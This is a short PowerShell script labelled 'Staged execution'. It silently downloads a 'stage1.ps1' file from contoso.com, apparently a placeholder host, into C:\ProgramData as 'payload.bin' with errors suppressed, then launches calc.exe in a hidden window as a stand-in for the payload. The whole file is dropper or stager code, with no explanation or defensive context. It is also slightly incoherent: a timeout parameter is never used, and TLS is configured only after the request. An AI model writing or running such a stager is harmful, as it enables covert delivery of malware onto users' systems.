
<# Staged execution #>
[CmdletBinding()]
param(
    [string]$TargetUrl = 'https://contoso.com/stage1.ps1',
    [string]$WorkingPath = 'C:\ProgramData\payload.bin',
    [int]$TimeoutSec = 11
)
Invoke-WebRequest -Uri $TargetUrl -OutFile $WorkingPath -UseBasicParsing -ErrorAction SilentlyContinue
Start-Process -FilePath "calc.exe" -WindowStyle Hidden -ErrorAction SilentlyContinue
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
